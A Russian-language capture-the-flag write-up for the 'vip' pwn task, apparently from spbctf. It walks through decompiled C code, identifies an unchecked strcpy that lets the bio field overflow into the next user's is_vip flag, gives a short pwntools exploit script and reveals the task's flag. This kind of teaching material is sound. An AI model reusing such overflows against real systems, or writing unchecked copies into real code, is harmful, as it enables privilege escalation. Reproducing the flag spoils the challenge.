[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn1_vip)
Описание:
Только VIP-пывнер сможет получить флаг
nc 109.233.56.90 11510
**[vip](https://pwn.spbctf.ru/files/overflow/vip)**

В точке входа первым делом создаётся аккаунт админа.
``` C
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  add_admin();
  menu();
}

__int64 __fastcall add_admin()
{
  users[0].is_vip = 1;
  strcpy((char *)&user_1, "admin");
  strcpy((char *)&password_1, "****************");
  return '********';
}
```
Чтобы получить флаг надо быть vip юзером.

Меню:
``` c
switch ( v3 )
{
  case 3:
    show_users();
    break;
  case 1:
    printf("Enter username: ");
    __isoc99_scanf("%s", username);
    printf("Enter password: ");
    __isoc99_scanf("%s", password);
    putchar(10);

    login(username, password);
    break;
  case 2:
    printf("Enter username: ");
    __isoc99_scanf("%s", username);
    printf("Enter password: ");
    __isoc99_scanf("%s", password);
    printf("Enter information about youself: ");
    __isoc99_scanf("%s", bio);
    putchar(10);

    reg(username, password, bio);
    break;
}
```
3 - выводит всех пользователей.
1 - вход в аккаунт.
2 - регистрация.

Создаю структуру:
``` c![](../../../../{DD5AC3E5-B973-417B-96A3-6D8C57D34355}.png)![](../../../../{DD5AC3E5-B973-417B-96A3-6D8C57D34355}%201.png)![](../../../../{DD5AC3E5-B973-417B-96A3-6D8C57D34355}%202.png)
struct __fixed(0x6F) user // sizeof=0x6F
{
  bool is_vip;
  char username[30];
  char password[30];
  char bio[50];
};
```

Вход в аккаунт:
``` c
void __fastcall reg(char *username, char *password, char *bio)
{
  int j; // [rsp+28h] [rbp-8h]
  int i; // [rsp+2Ch] [rbp-4h]

  for ( i = 0; i <= 9; ++i )
  {
    if ( !strcmp(users[i].username, username) )
    {
      puts("Username exists");
      return;
    }
  }
  for ( j = 0; ; ++j )
  {
    if ( j > 9 )
    {
      printf("No space left for registration. Exiting...");
      exit(0);
    }
    if ( !users[j].username[0] )
      break;
  }

  strcpy(users[j].username, username);
  strcpy(users[j].password, password);
  strcpy(users[j].bio, bio);
}
```
В алгоритме регистрации лежит уязвимость, т.к. все userы лежат подряд в памяти, я могу зарегистрировать пользователя, указать имя, пароль, а буфер bio переполнить и указать для следующего юзера is_vip == 1, т.к. переменная is_vip не перезаписывается.

Эксплоит:
``` python
io = start()

io.recvuntil(b'exit')

# Создание аккаунта
io.sendline(b'2')
io.recvuntil(b': ')
io.sendline(b'1')
io.recvuntil(b': ')
io.sendline(b'1')
io.recvuntil(b': ')
payload = b'A' * 50 + p8(1)
io.sendline(payload)

# флаг руками достать можно
io.interactive()
```

Проверка:
![{B83DD1A1-2EA0-4AA4-976E-4FF74F1E1F84}](../../../../z.%20Images/{B83DD1A1-2EA0-4AA4-976E-4FF74F1E1F84}.png)
![Pasted image 20260310152632](../../../../z.%20Images/Pasted%20image%2020260310152632.png)

Ответ: `spbctf{d0_n07_f0r637_70_ch3ck_v4r14bl3_51z3}`